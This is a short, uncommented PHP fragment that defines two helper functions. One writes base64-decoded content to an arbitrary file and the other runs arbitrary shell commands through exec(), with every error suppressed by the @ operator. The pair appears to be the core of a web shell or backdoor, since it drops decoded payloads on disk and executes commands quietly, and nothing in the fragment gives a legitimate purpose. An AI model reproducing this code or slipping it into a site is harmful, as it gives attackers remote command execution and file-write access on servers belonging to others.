<?php
function cf($f,$t) {
	$w=@fopen($f,"w");
	@fputs($w,@base64_decode($t));
	@fclose($w);
}
	
function ex($in) {
	@exec($in,$res);
	$res = @join("\n",$res);
	return $res;
}

